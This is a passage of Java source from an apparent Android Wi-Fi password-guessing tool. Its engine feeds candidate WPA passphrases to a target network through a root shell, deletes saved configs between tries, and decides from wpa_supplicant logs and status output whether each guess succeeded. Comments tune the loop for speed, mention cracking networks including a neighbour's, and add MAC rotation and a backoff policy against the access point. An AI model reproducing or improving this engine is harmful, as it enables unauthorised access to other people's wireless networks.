        // 之前用「cost < 5000」当门槛，会把能用但慢的机器误判成未接入 ——
        // 那是把可用性判据和性能判据混在一起了，是错的。
        // 现在只看：命令能不能执行、返回内容像不像 WiFi 输出。
        boolean ok = looksLikeWifi;
        String summary;
        if (!ok) {
            summary = L.s("通道返回内容异常", "channel returned unexpected output");
        } else if (cost > 8000) {
            summary = L.s("通道已接入（较慢）", "channel attached (slow)");
        } else {
            summary = L.s("通道已接入", "channel attached");
        }
        return new ChannelProbe(ok, summary, join(p), p.steps);
    }

    private static String join(ChannelProbe p) {
        StringBuilder sb = new StringBuilder();
        for (String s : p.steps) sb.append(s).append('\n');
        return sb.toString().trim();
    }

    private static String firstLine(String s) {
        int i = s.indexOf('\n');
        String line = i > 0 ? s.substring(0, i) : s;
        return line.length() > 80 ? line.substring(0, 80) + "..." : line;
    }

    // ------------------------------------------------------------------ 单条尝试

    /**
     * 试一条。阻塞，放工作线程。
     *
     * 不管走哪个通道，判定都在这里统一做。
     */
    public Attempt tryOne(NetRecord target, String security, String password, long timeoutMs) {
        return tryOne(target, security, password, timeoutMs, null);
    }

    /**
     * 与 {@link #tryOne(NetRecord, String, String, long)} 相同，但带上本条候选的尝试标识。
     *
     * <p>标识与窗口元数据在**这里统一回填**，判定逻辑一行不碰：
     * <ul>
     *   <li>{@code attemptId} 为空/非法 → Attempt 里保持空串（显式无效）</li>
     *   <li>窗口元数据追加到 detail，供事后复盘「这段日志到底属不属于本条候选」</li>
     * </ul>
     */
    public Attempt tryOne(NetRecord target, String security, String password,
                          long timeoutMs, String attemptId) {
        long t0 = SystemClock.uptimeMillis();

        if (!isValidLength(password)) {
            // 复核修正（2026-10-24）：这条**不是**认证失败，而是「候选本身不合法、
            // 从未被尝试」。原来标 AUTH_FAIL 有两个后果：
            //   ① 就「无证据不得判失败」而言，它是一条绕过六阶段新规则的旧分支；
            //   ② BackoffPolicy.countable(AUTH_FAIL)=true，于是 0ms 的无效候选会被
            //      当成「AP 的响应样本」喂进退避统计。
            // 现在归 ERROR + reason=invalid-candidate（非失败类），且不计入退避样本。
            Attempt a = new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0,
                    L.s("候选本身不合法（WPA 要求 8-63）—— 未尝试，不是密码错误",
                        "the candidate itself is invalid (WPA needs 8-63) - "
                                + "not attempted, not a wrong passphrase"),
                    "invalid");
            a.reason = "invalid-candidate";
            a.attemptId = AttemptId.wellFormed(attemptId) ? attemptId : "";
            return a;
        }

        // 只有 Root（su + cmd wifi）一条通道
        Attempt a = tryOneShell(target, security, password, timeoutMs, t0, attemptId);
        a.attemptId = AttemptId.wellFormed(attemptId) ? attemptId : "";
        a.logWindow = lastWindow;
        if (lastWindow != null) {
            a.detail = a.detail + L.f(" [窗口 %s]", " [window %s]", lastWindow.describe());
        }
        return a;
    }

    /**
     * Root：发连接命令，**判定只认 NetworkWatcher 的事件**。
     *
     * <h3>为什么推倒重来</h3>
     * 旧实现轮询 `WifiInfo` / 解析 `cmd wifi status`，叠了三层防护仍然误报：
     * <pre>
     *   基线检查  → 断开瞬间 SSID 变 null，被判"已清空"，其实系统马上回连
     *   物理下限  → 3 秒，系统回连有时恰好越过
     *   SSID 匹配 → 只说明"现在连着谁"，不说明"是谁连的"
     * </pre>
     * 根子上是因为**从来没有拿到过一个可信的"连上了"事件**。
     *
     * <h3>现在怎么判</h3>
     * {@link NetworkWatcher} 注册系统回调，在网络可用的**那一刻**记录事件。
     * 判定只问一个问题：
     * <pre>
     *   发出这条候选（commandAt）之后，
     *   系统有没有报告过目标 SSID「变为可用」？
     * </pre>
     * 之前就连着、或者中途系统自己回连且发生在 commandAt 之前 —— 都不算。
     * 这个判据不依赖文本解析，也不依赖轮询时机。
     */
    private Attempt tryOneShell(NetRecord target, String security, String password,
                                long timeoutMs, long t0, String attemptId) {
        lastWindow = null;
        if (shell == null) {
            return new Attempt(password, Verdict.ERROR,
                    SystemClock.uptimeMillis() - t0, L.s("未配置 shell 通道", "no shell channel"), "");
        }

        long statT0 = SystemClock.uptimeMillis();
        statPrepMs = 0; statProbeMs = 0; statPollMs = 0; statLogMs = 0; statRounds = 0;

        // 每条之前删净旧配置（配置复用会让任何密码都"成功"）。
        // 走引擎自带实现，保证各调用方行为一致。
        if (!forgetTargetByShell(target.ssid)) {
            return new Attempt(password, Verdict.UNKNOWN,
                    SystemClock.uptimeMillis() - t0,
                    L.s("无法清除旧配置，本条结果不可信",
                        "could not clear stale config; this attempt is unreliable"),
                    "");
        }

        // **净检：确认目标配置真的没了**。
        //
        // 这是防「假阳性」的第一道闸。实机出现过 4 个不同网络都在第 1 条
        // password 就"已破解"——根因就是旧配置没清掉，系统拿已保存的
        // 正确密码（或 PMKSA 缓存）连上了，跟候选本身毫无关系。
        //
        // 做法：回读 list-networks，目标只要还挂着 netId，本条就不可能有
        // 可信结论 —— 直接判 UNKNOWN，不让它污染结果。
        long staleNetId = netIdOfTarget(target.ssid);
        if (staleNetId >= 0) {
            return new Attempt(password, Verdict.UNKNOWN,
                    SystemClock.uptimeMillis() - t0,
                    L.s("旧配置未清除（netId=" + staleNetId + "），本条结果不可信",
                        "stale config not cleared (netId=" + staleNetId
                                + "); this attempt is unreliable"),
                    "");
        }

        // **如果上一条已经连上了目标，必须先真正断开**。
        //
        // 不做这一步会出假阳性：上一条（比如正确密码）连上目标后，配置虽然被
        // forget 掉，但系统仍保持连接；此时再拿一个**错误密码**发命令，
        // 系统会「本来就连着」→ 判定看到 connected → 误判成这条也成功。
        // 实测：B214 正确密码 12345678 连上后，紧接着的 88888888 被判「看起来连上了」。
        //
        // 只在「已经连着目标」时才断开，正常情况（连着别的网络）零开销。
        /*
         * 判断「命令前是否还连着目标」，不能只看 SSID。
         *
         * snapshotSsid() 走 shell 的 cmd wifi status，超时/抖动时返回 null。
         * 只看 SSID 的话 null 会被当成「没连着目标」而放过 —— 但此刻
         * 系统可能仍挂着目标配置，判据 A 下一轮就误判成功。
         * 这是假阳性的直接入口。
         *
         * 兜底：SSID 读不到时看 netId。list-networks 里还有目标的条目，
         * 同样说明配置没清干净，必须先断开。
         */
        String preSsid = snapshotSsid();
        boolean linkedBySsid = target.ssid.equals(preSsid);
        long preNetId = linkedBySsid ? -2L : netIdOfTarget(target.ssid);
        boolean linkedByNetId = preNetId >= 0;
        if (linkedBySsid || linkedByNetId) {
            if (linkedByNetId && !linkedBySsid) {
                android.util.Log.i(TAG,"SSID read failed but netId=" + preNetId + " still present; disconnecting");
            }
            boolean off = disconnectAndVerify(target.ssid);
            if (!off) {
                return new Attempt(password, Verdict.UNKNOWN,
                        SystemClock.uptimeMillis() - t0,
                        L.s("上一条的连接未能断开，本条判定不可信",
                            "previous link could not be dropped; this attempt is unreliable"),
                        "");
            }
        }

        // 清日志缓冲。判定完全依赖命令之后新产生的日志行，
        // 所以这一步是归因的前提，不能省。
        //
        // R6：不再「清完就当它清了」——
        //   ① 记录清理动作是否真的拿到帧（exec 返回 null = 超时/失联）
        //   ② 清完立刻写一行**起点标记**，作为「窗口从这里开始」的可验证证据
        //   ③ 每轮读日志时用 readCommand() 把标记与证据一起读回来，
        //      由 AttemptMarker.evaluate 算出窗口元数据（只记录，不改判定）
        WifiStateLog.ClearResult clearRes = WifiStateLog.clearChecked(shell);
        String markerCmd = AttemptMarker.writeCommand(attemptId);
        boolean markerWritten = false;
        if (markerCmd != null) {
            try {
                shell.exec(markerCmd, 4000);
                markerWritten = true;   // 只表示命令已发出；可见性由 evaluate 判断
            } catch (Throwable ignored) {}
        }

        // **命令发出时刻**：判定以此为界。
        // 之后出现的「目标 SSID 已连上」才可能是这条候选的功劳。
        final long commandAt = SystemClock.uptimeMillis();
        statPrepMs = commandAt - statT0;

        // 记录命令前的当前 SSID 与 netId。
        // 若命令后系统回连到别的已保存网络，我们不能把那个连接算到这条候选头上。
        // netId 是更强的判据：即使 SSID 相同，只要 netId 变了就是新建立的联系。
        final String ssidBefore = snapshotSsid();
        final long netIdBefore = currentNetId();

        // ══════════════════════════════════════════════════════════════
        //  发起连接。
        //
        //  统一走 `cmd wifi connect-network`。
        //
        //  历史：曾给 Shizuku 通道单独做过 binder 直调（addOrUpdateNetwork +
        //  enableNetwork），理由是 `cmd wifi` 对 SSID/密码里的特殊字符敏感。
        //  但 Shizuku 通道已在 1.9.24 移除；在 Root 下 `cmd wifi` 实测可用
        //  （ConnectSpec 负责转义），保留一条路径更好维护。
        // ══════════════════════════════════════════════════════════════
        {
            final String cmd = ConnectSpec.buildConnect(target.ssid, security, password,
                    pinBssid ? target.bssid : null, macRotate);
            final ShellChannel sh = shell;
            new Thread(() -> {
                try { sh.exec(cmd, 20000); } catch (Throwable ignored) {}
            }, "wpaforge-engine-conn").start();
        }

        // 命令后目标会得到一个新 netId（配置已在此之前删净并回读确认）。
        // 用它和 status 里的 Net ID 比对，把「连上了目标」严格归因到这条候选。
        //
        // 原来是固定 sleep(400) 再查一次：快机器上白等，慢机器上可能还没建好。
        // 改成轮询 —— 最快 100ms 就能继续，最多等 600ms。
        // 不再为了拿 netId 在这里白等。
        //
        // 实测（2026-10-24，B212，三次）：framework 把配置建出来要
        // **242 / 267 / 324 ms**。老代码固定等 600ms（白扔半秒/条），
        // 我在提速时压到 200ms —— **压过头**：配置还没出现就返回，
        // netId 永远是 -1。现在改成**把探测挪进主循环的前几轮**
        // （那时本来就在轮询）：白等没了，证据照样能在 ~300ms 拿到。
        long statProbe0 = SystemClock.uptimeMillis();
        long targetNetId = -1;
        statProbeMs = SystemClock.uptimeMillis() - statProbe0;

        android.util.Log.i(TAG, "tryOneShell start: " + target.ssid
                + " pw=" + password.length() + " timeout=" + timeoutMs
                + " ssidBefore=" + ssidBefore);

        long deadline = t0 + timeoutMs;
        // 捕获握手第 1 帧后可动态延长看门狗，只延长一次
        boolean m1Extended = false;
        // M1 重发 = 密码错误的早期信号（实测：第 2 次 M1 稳定出现在第 1 次之后约 0.96 秒）。
        // 命中即先"武装"，再过 120ms 复核一次才判失败 ——
        // 万一那条 M1 是丢包重传、而密码其实正确，这 120ms 里握手会完成，
        // 上面的成功判据会先返回 SUCCESS，不会造成漏判。
        boolean m1RetryArmed = false;
        long m1RetryArmedAt = 0L;
        // 认证失败广播的“武装”时刻（第三级早退的 120ms 复核用）
        long authArmedAt = 0L;
        // ---- 每条候选的耗时分解（2026-10-23 加：用来定位“时快时慢”）----
        // 记三个关键节点，判定时附在结果里，界面/日志直接可见：
        //   关联 = 看到「目标 SSID 正在关联」的时刻
        //   M1   = 收到握手第 1 帧的时刻
        //   广播 = 收到系统「认证失败」广播的时刻
        long tAssocMs = -1L, tM1Ms = -1L, tAuthMs = -1L;
        // 是否已观察到「系统离开了命令前的那条连接」——回连判据的前置条件
        boolean leftBaseline = false;
        // 是否出现过「连着目标但 netId 对不上」——只用于收尾时把话说清楚，不作否决
        boolean suspectNetIdConflict = false;
        // 是否因「目标出现在 status」而延长过看门狗（只延一次）
        boolean extendedForTargetSight = false;

        // 本轮是否见过目标「正在尝试」——用于区分「通道没生效」和「密码不对」
        // 因 netId 不符而拒绝的连接次数（假阳性防线计数器）
        int netIdRejects = 0;
        boolean sawAttempt = false;
        // shell 通道是否真的能执行命令（status 能读出内容）。
        // 通道读不到 logcat 时 sawAttempt 恒为 false；有了这个标志就能把
        // 「密码错」和「通道死」区分开，不再一律 UNKNOWN。
        boolean channelAlive = false;
        String lastStatusSsid = null;
        // 分层证据记录（结束时不命中就逐层打印，让用户看清卡在哪一层）
        int logRounds = 0, statusRounds = 0;
        int logRound = 0;
        // 本轮 `cmd wifi status` 读到的 netId（供判据 C/D 复用，避免重复起 shell）
        long roundNetId = -1;

        // 日志判据是否可用：Root 通道能读 logcat，通道断了就读不到。
        // 探测一次（读一小段），失败就只走 status/netId 判据。
        // 探测「日志能不能读」要用**真正要读的那个源**：
        // 以前这里探测的是状态机日志（-e ClientModeImpl，本机只有 ContextImpl 噪音），
        // 与后面实际读的 wpa_supplicant 不是一回事，探测结论没有意义。
        // 日志可读性：**不能一次性探测**（2026-10-23 实测翻车）。
        //
        // 旧写法是在这里读一次 `logcat -d -s wpa_supplicant`，看输出里有没有
        // "wpa_supplicant" 字样。但此刻缓冲刚被 `logcat -c` 清空、连接命令才发出
        // 几毫秒，日志里**必然还没有任何行** → 探测失败 → logReadable 恒为 false
        // → 下面整段日志判据（含快速失败）被永久跳过，只能干等状态机。
        //
        // 实测证据：把早退判据加进去后，App 仍然是 5.82 秒/条（99 秒 17 条），
        // 而同样的判据在 shell 靶场里是 2.08 秒/条 —— 差别就在这里。
        //
        // 现在改成**惰性**：每轮照常读日志，一旦读到过 wpa_supplicant 的行就置位。
        // 读日志本身每轮约 40ms，代价可接受；换来的是快速路径真的会生效。
        boolean logReadable = false;

        // ══════════════════════════════════════════════════════════════
        //  唯一判据：Supplicant state: COMPLETED
        //
        //  判定「密码对不对」的本质是「4-Way Handshake 有没有完成」。
        //  密码错误时握手必然失败，wpa_supplicant 永远到不了 COMPLETED。
        //  这是系统对「密钥协商成功」的宣告，不是我们猜的状态。
        //
        //  为什么砍掉了之前的四条判据（日志 / watcher / wifiinfo / netId 组合）：
        //  它们都能被「系统回连别的网络」满足 —— 实机反复出现假阳性，
        //  自己的网、邻居家的网都在第一条 12345678 上被误判成功。
        //  宁可漏判（把对的判成没连上），也绝不能误判（把错的判成命中）。
        //
        //  四个条件必须**同源于同一行 WifiInfo**：
        //    ① SSID == 目标
        //    ② Supplicant state == COMPLETED
        //    ③ IP 是有效地址（排除 0.0.0.0）
        //    ④ Net ID == 本条新建的 netId
        // ══════════════════════════════════════════════════════════════
        while (SystemClock.uptimeMillis() < deadline) {
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.ABORTED,
                        SystemClock.uptimeMillis() - t0, L.s("已中断", "aborted"), "");
            }
            statRounds++;
            // 前 4 轮里顺便探掉「本条命令有没有建出配置」：
            //   · 建出来了 → 记下 netId（证据串要用，非否决项）
            //   · 4 轮还没建出来（>400ms）→ 这条命令很可能被框架悄悄丢了。
            //     `cmd wifi connect-network` 成功失败都**不打印任何东西**，
            //     只有「配置存不存在」能证明它生效。
            if (targetNetId < 0 && statRounds <= 4) {
                long id = netIdOfTarget(target.ssid);
                if (id >= 0) targetNetId = id;
            }
            // 间隔自适应（2026-10-23 实测后调整）：
            //   前 1.2 秒 = 全速轮询（间隔 20ms）。这一段时间里会出现最早的成功证据
            //   （实测正确密码 950ms 内完成）和最早的失败证据（M1#2 约在 1.5~2.5s），
            //   轮询越密，判定越早，早退越有效。
            //   1.2 秒之后 = 80ms 一轮，省 CPU、也不影响早退（那时信号已经来了）。
            // 每轮真实成本：`su -c cmd wifi status` ~17ms + 一次 logcat 读 ~40ms。
            sleep(SystemClock.uptimeMillis() - t0 < 1200L ? 20L : 80L);

            // 曾把这一轮的两条命令合并成一条（哨兵分隔）想省一次往返，
            // 实测**反而更慢**：合并后 79ms/轮，分开只要 44ms/轮。
            // 原因是日志那一半有 33KB，塞进同一个管道会和 status 抢缓冲、互相等。
            // 回退成两条独立调用。（日志本身改用服务端预过滤，见 WpaLogReader。）
            // ---- R3：本轮日志事实，与 status 同轮一起看 ----
            //
            // 为什么必须读在状态判据之前：同一个轮次里，「系统回连了别的网络」与
            // 「日志里目标的握手已完成」可能同时成立（日志是窗口，status 是瞬时）。
            // 原来日志段排在回连出口之后，本轮日志还没读就已经 return AUTH_FAIL ——
            // 成功证据被失败判据抢答（审计 S2-3）。现在证据先读齐、再按优先级判。
            long statLog0 = SystemClock.uptimeMillis();
            String wlog = WpaLogReader.read(shell, 400);
            lastWindow = AttemptMarker.evaluate(attemptId, clearRes.ok(), markerWritten, wlog);
            statLogMs += SystemClock.uptimeMillis() - statLog0;
            // 窗口证据是否可用：**必要条件**，不是任何结论的充分条件。
            // 为假时不得使用日志证据（更不得把「没看到失败行」当成认证失败）。
            boolean logWinUsable = lastWindow != null && lastWindow.evidenceUsable();
            // R3：日志类判据**只在切片上跑** —— 切片 = 本条候选起点标记之后的部分。
            // 这样「清空失败留下的陈旧行」「别人窗口的行」都不再可能被算到本条头上；
            // 窗口不可用时切片为空，判据函数在其上只会得到 false（= 无证据，而非失败）。
            String wlogSlice = logWinUsable ? AttemptMarker.sliceAfter(wlog, attemptId) : "";
            /** R3：本条候选是否真的被有效执行过（轮级，失败类结论的归属前提） */
            boolean exercised = false;
            // 本轮是否已出现「目标的握手完成」——用于阻止失败判据抢答成功证据
            boolean negotiatedThisRound = !wlogSlice.isEmpty()
                    && WpaLogReader.sawNegotiatedFor(wlogSlice, target.bssid);

            String st = null;
            long statStatus0 = SystemClock.uptimeMillis();
            try { st = shell.exec("cmd wifi status", 5000); } catch (Throwable ignored) {}
            statPollMs += SystemClock.uptimeMillis() - statStatus0;
            if (st != null && !st.trim().isEmpty()) {
                channelAlive = true;
                statusRounds++;
                SupplicantParser.Info info = SupplicantParser.parse(st);
                lastStatusSsid = info.ssid;

                // 记录「目标是否进入过握手」——用于区分「密码错」和「根本没试」
                if (!sawAttempt && target.ssid.equals(info.ssid)
                        && info.state != null && !info.state.isEmpty()) {
                    sawAttempt = true;
                    // 目标出现在 status 里 = 这次尝试真的在推进（关联中/握手中/已连上）。
                    // 给它多留 4 秒：实测某些 AP 从关联到完成握手要 5~9 秒
                    // （-63dBm 那台实测 8.8 秒），窗口卡太紧会把**正确密码**切断成
                    // 「没结论」—— 那就是漏判。只延一次，且只在看到目标时延，
                    // 错误密码通常不会让目标出现在 status 里，所以不会拖慢整体。
                    if (!extendedForTargetSight) {
                        deadline = Math.max(deadline, SystemClock.uptimeMillis() + 4000L);
                        extendedForTargetSight = true;
                        android.util.Log.i(TAG, "目标出现在 status (" + info.state + ")，看门狗延长 4s");
                    }
                }

                /*
                 * 判据 A 的 netId 绑定（宽松式）。
                 *
                 * 历史两头都踩过：
                 *   · 完全不看 netId → 系统回连/残留配置被判成功（假阳性）
                 *   · 硬要求 netId 等于命令后 400ms 取到的值 → 那个值常常是 -1，
                 *     正确密码永远判不出来（假阴性，实机 12 秒全超时）
                 *
                 * 折中：**只在两侧都拿到有效 netId 时才强制相等**。
                 *   任一侧为 -1 → 当作证据不足，退回原三条件判定。
                 */
                long statusNetId = info.netId;
                boolean netIdMismatch = statusNetId >= 0
                        && targetNetId >= 0
                        && statusNetId != targetNetId;
                if (netIdMismatch) {
                    // netId 对不上只**记录**，不作否决。
                    //
                    // 为什么不能拿它否决：targetNetId 是「命令发出后取到的值」，
                    // 本身时序敏感（取早了是 -1，取晚了可能已经是别的连接的）。
                    // 历史事故：正确密码因为 netId 对不上被整段跳过成功判断，
                    // 实机 12 秒全超时 —— 那就是典型的漏判。
                    //
                    // 归因本来就不靠它：命令之前有两道前置闸门
                    //   ① forgetTargetByShell 已确认目标配置删净并回读校验
                    //   ② 命令前若连着目标，已断开并确认断开
                    // 所以命令之后出现的「目标 + 握手完成 + 有 IP」只可能来自本条候选。
                    netIdRejects++;
                    suspectNetIdConflict = true;
                    if (netIdRejects <= 3) {
                        android.util.Log.i(TAG, "netId 对不上（仅记录，不否决）status="
                                + statusNetId + " this=" + targetNetId);
                    }
                }
                // ---- R3：归属基础 —— 「本条候选到底有没有被有效执行过」----
                //
                // 两条独立证据任一成立即可：
                //   · 框架为本条命令建出了配置（targetNetId >= 0）= 命令确实生效
                //   · 本次见过目标进入状态（sawAttempt，来自 status 或本窗口日志）
                // 失败类结论都必须以它为前提：否则「系统自己回连了别的网络」「上一条
                // 候选留下的失败广播」这类与本次无关的事件，会把一条**从未被执行**的
                // 候选判成认证失败（审计 S2-2 / S6-1）。
                exercised = sawAttempt || targetNetId >= 0;

                // 成功判定走唯一的纯逻辑入口（SuccessRule）—— netId 不参与，
                // 避免它因时序问题否决一次真实的命中（漏判）。
                SuccessRule.Assessment sa = SuccessRule.assess(target.ssid, info.ssid,
                        info.state, info.ip, statusNetId, targetNetId);
                if (sa.verdict != null) {
                    // **不再强制 netId 必须等于「命令后 400ms 取到的那个值」。**
                    //
                    // 那个值是时序敏感的：系统若还没把配置建好，取到 -1，
                    // 就会让**所有**候选永远判不成功（实机现象：密码正确
                    // 但 12 秒超时、status 读了 33 轮一次不命中）。
                    //
                    // 归因改由两道**前置**闸门保证（都在命令之前完成）：
                    //   ① forgetTargetByShell 已确认目标配置被删净
                    //   ② 若命令前已连着目标，已强制断开并确认断开
                    // 因此命令之后出现的「目标 + 握手完成 + 有 IP」
                    // 只可能来自这一条候选。
                    //
                    // netId 只在拿得到时作为**加分确认**记录，不作阻断。
                    long ms = SystemClock.uptimeMillis() - t0;
                    if (sa.verdict == Verdict.UNKNOWN) {
                        // 协议层看到「目标 + 握手完成 + 有 IP」，但 netId 与本次新建配置
                        // 不一致 → 归属存疑：既不当成功（可能是旧配置/同名网络回连），
                        // 也不当失败（可能只是一步慢了的真实命中）。如实报「未确认」。
                        android.util.Log.i(TAG, "成功帧但归属冲突: " + info
                                + " (statusNetId=" + statusNetId
                                + " this=" + targetNetId + ")");
                        Attempt conflict = new Attempt(password, Verdict.UNKNOWN, ms,
                                L.s("握手完成且已获取 IP，但其 netId 与本次新建配置不一致，"
                                                + "无法确认归属（不等于密码错误）",
                                    "handshake completed with an IP, but its netId differs "
                                            + "from the one created by this attempt - "
                                            + "attribution unconfirmed (not a wrong passphrase)"),
                                sa.evidence);
                        conflict.reason = sa.reason;
                        return conflict;
                    }
                    android.util.Log.i(TAG, "命中: " + info
                            + " (targetNetId=" + targetNetId + ")");
                    return new Attempt(password, Verdict.SUCCESS, ms,
                            L.s("握手完成且已获取 IP（确认连上）",
                                "handshake completed and IP obtained"),
                            sa.evidence);
                } else {
                    /*
                     * ---- 失败加速：系统已经回连到别的网络 ----
                     *
                     * 为什么需要它：本机（ColorOS 15）**不输出** wpa_supplicant 与
                     * 状态机日志（实测 `-s wpa_supplicant` 0 行、`-e ClientModeImpl`
                     * 只有 ContextImpl 噪音），所以 assoc_reject / handshake failed
                     * 这类信号根本不存在 —— 错误密码只能干等 10 秒超时。
                     *
                     * 但有一条本地信号是可靠且免费的：**系统不会同时连两个网络**。
                     * 它去连别的网络，就说明目标这次尝试已经结束、且没连上。
                     * `cmd wifi status` 本来就每轮在读（18ms），零额外开销。
                     *
                     * 保守之处（宁可漏判，绝不误判）：
                     *   · 必须先观察到「系统离开了命令前那条连接」才启用本判据 ——
                     *     否则命令刚发出、status 还停留在原网络时就会被误判成失败
                     *   · 再要求距命令 ≥ FAILOVER_MIN_MS
                     *   · 只判 AUTH_FAIL，绝不判 SUCCESS
                     */
                    boolean onOtherNetwork = info.ssid != null && !info.ssid.isEmpty()
                            && !target.ssid.equals(info.ssid)
                            && info.state != null
                            && "COMPLETED".equalsIgnoreCase(info.state);
                    if (!onOtherNetwork) {
                        leftBaseline = true;
                    } else if (FailoverRule.looksLikeFailover(target.ssid, info.ssid, info.state,
                            leftBaseline, SystemClock.uptimeMillis() - commandAt,
                            // 归属：本条候选确实被尝试过
                            exercised,
                            // 证据冲突：本轮已有目标的成功证据 → 交给成功判据，不抢答失败
                            negotiatedThisRound)) {
                        long ms = SystemClock.uptimeMillis() - t0;
                        android.util.Log.i(TAG, "快速失败(回连): 系统已连上 " + info.ssid);
                        return new Attempt(password, Verdict.AUTH_FAIL, ms,
                                L.f("系统已回连到其它网络 %s —— 目标这次没连上",
                                    "system fell back to %s - the target did not connect",
                                    info.ssid),
                                "failover");
                    }
                }
            }

            // ---------- 判据 B：wpa_supplicant 握手日志（参考 bszapp 的做法） ----------
            //
            // 那套实现判定成功的依据就是日志里的
            //   wlan0: Trying to associate with SSID 'X'
            //   WPA: Key negotiation completed with ...
            // 前者给出「这次在试哪个网络」，后者是「握手完成」——
            // 两行合起来就是密码正确的直接证据，比轮询状态更早。
            //
            // 失败也有明确信号：
            //   WPA: 4-Way Handshake failed - pre-shared key may be incorrect
            //   CTRL-EVENT-ASSOC-REJECT
            // 见到就直接判密码错，不用傻等超时。
            //
            // 前提：命令发出前已 logcat -c，所以这里读到的都是本次的行。
            // 每轮都读日志。原来这里是 `logRound++ % 3 == 0` ——
            // 每 3 轮（约 1.2 秒）才读一次，而「握手失败 / 关联被拒」
            // 恰恰是**最快**的失败信号。等 1.2 秒才看一眼，
            // 相当于每条候选白白多等一个轮询周期。
            // 一次 logcat 读只要 239ms（真机实测），付得起。
            {
                if (wlog != null && !wlog.isEmpty()) {
                    // 预过滤之后输出里不会再有 "wpa_supplicant" 这个字样
                    // （那是 tag，-s 过滤后不打印），能读到非空行本身就是
                    // 「这条通道读得到日志」的证据。
                    if (!logReadable) {
                        logReadable = true;   // 惰性置位：只要看到过就长期有效
                        android.util.Log.i(TAG, "日志通道确认可读");
                    }
                    logRounds++;
                    // 日志事实一律受窗口闸约束：窗口不可用时，这条「关联行」
                    // 可能来自上一条候选（审计 S3-2）。
                    boolean tried = logWinUsable && WpaLogReader.sawAssociateFor(
                            wlogSlice, target.ssid);
                    if (tried) {
                        sawAttempt = true;
                        if (tAssocMs < 0) tAssocMs = SystemClock.uptimeMillis() - t0;
                    }

                    // 捕获握手第 1 帧 (RX message 1 of 4-Way Handshake) -> 动态延长看门狗，给握手完成留足时间
                    if (tried && !m1Extended && WpaLogReader.sawHandshakeM1(wlogSlice)) {
                        deadline = Math.max(deadline, SystemClock.uptimeMillis() + 2500L);
                        m1Extended = true;
                        android.util.Log.i(TAG, "捕获握手第 1 帧，看门狗延长 2.5s");
                    }

                    // 必须校验**这个握手是目标的**：日志里同一时刻常常还有
                    // 系统回连别的网络并握手成功的记录，只判断「出现过协商完成」
                    // 会把别的网络算成命中（2026-10-22 假阳性事故）。
                    if (tried && WpaLogReader.sawNegotiatedFor(wlogSlice, target.bssid)) {
                        long ms = SystemClock.uptimeMillis() - t0;
                        android.util.Log.i(TAG, "命中(日志): 关联目标后完成协商");
                        return new Attempt(password, Verdict.SUCCESS, ms,
                                L.s("日志确认握手完成（Key negotiation completed）",
                                    "log confirms handshake completed"),
                                "wpalog");
                    }
                    // 失败判定**不再要求先看到 "Trying to associate"**：
                    // `4-Way Handshake failed` / `reason=WRONG_KEY` 这两行本身就是
                    // 「本次尝试失败」的直接记录，不需要再拿关联行做前置条件。
                    // （旧逻辑用 tried 做前置：一旦关联行被 ColorOS 的日志配额丢掉，
                    //   失败行即使读到了也不会被采纳，只能干等超时。）
                    // 带归属的失败信号优先：`CTRL-EVENT-SSID-TEMP-DISABLED ssid="X"` 里
                    // 有 SSID，能确认是目标的失败。另外两种（Handshake failed / ASSOC-REJECT）
                    // 不带归属，所以仍要求本次见过目标的关联尝试。
                    // ── 早期失败（第三级，最可靠）：系统广播「认证失败」 ────────────
                    // framework 在 WPA 握手失败时发 SUPPLICANT_STATE_CHANGED_ACTION +
                    // ERROR_AUTHENTICATING（系统弹的「密码错误」对话框就靠它）。
                    // 这条信号**不经过 logcat**，厂商日志配额砍不掉它，也不需要 root。
                    // 归属：必须发生在「本条命令发出之后」，且本轮没有成功证据。
                    // 再等 120ms 复核一次 —— 万一这条候选其实是对的，
                    // 这 120ms 里的成功判据会先返回 SUCCESS，不会漏判。
                    if (authWatch != null && authWatch.isRegistered()) {
                        boolean succ = WpaLogReader.sawNegotiatedFor(wlogSlice, target.bssid);
                        // R3：同样要求「本条确实被尝试过」——上一条候选留下的认证失败
                        // 广播可能恰好落进本条的窗口，若本条根本没被执行过，就不能采信。
                        if (exercised
                                && WifiAuthFailureWatcher.ssidMatches(authWatch.lastErrorSsid(),
                                    target.ssid)
                                && WifiAuthFailureWatcher.authErrorImpliesWrongKey(
                                    authWatch.lastErrorAt(), commandAt, succ)) {
                            if (tAuthMs < 0) tAuthMs = SystemClock.uptimeMillis() - t0;
                            if (authArmedAt == 0L) {
                                authArmedAt = SystemClock.uptimeMillis();
                            } else if (SystemClock.uptimeMillis() - authArmedAt >= 120L) {
                                long ms = SystemClock.uptimeMillis() - t0;
                                android.util.Log.i(TAG, "早期失败(第三级): 系统广播认证失败");
                                return new Attempt(password, Verdict.AUTH_FAIL, ms,
                                        L.s("系统报告认证失败 → 密码错误",
                                            "system reported auth failure -> wrong passphrase")
                                                + timing(tAssocMs, tM1Ms, tAuthMs),
                                        "authcast");
                            }
                        }
                    }

                    // ── 早期失败（第二级，最快）：M1 之后静默 ────────────────────
                    // 真机：正确密码从命令到「四条件成立」只要 670~722ms，M2 在 M1 后 4ms
                    // 发出、M3/M4 紧随；错误密码时 AP 要等 1.0 秒才重发 M1。
                    // 所以 M1 后 600ms 内没有任何「Key negotiation completed」→ 密码错。
                    // 只可能漏判、不可能误判（成功仍由四条件同行独占判定）。
                    // 归属保护：优先用 M1 行自带的 BSSID（可靠）；
                    // BSSID 缺失时才退回「见过目标的关联行」。
                    boolean targetBssidKnown = target.bssid != null && !target.bssid.isEmpty();
                    int m1ForTarget = targetBssidKnown
                            ? WpaLogReader.countHandshakeM1For(wlogSlice, target.bssid) : 0;
                    boolean m1SeenForTarget = targetBssidKnown
                            ? (m1ForTarget >= 1)
                            : (tried && WpaLogReader.sawHandshakeM1(wlogSlice));
                    int m1CountForTarget = targetBssidKnown
                            ? m1ForTarget
                            : (tried ? WpaLogReader.countHandshakeM1(wlogSlice) : 0);

                    if (m1SeenForTarget) {
                        // R2（2026-10-24）：这里原来会在「M1 之后静默 1200ms」时直接
                        // 返回 AUTH_FAIL —— 那是**纯时间判据**：它只能证明「这段时间
                        // 没观察到证据」，不能证明「观察到失败证据」（审计 S4-1：
                        // 成功证据晚到 100ms 就被吞掉，把正确密码判负）。
                        //
                        // 现在这一段只留耗时/诊断记录，**不结案**。失败结论一律由下面
                        // 的证据路径给出：AP 重发 M1（协议层观察）+ 120ms 复核窗口
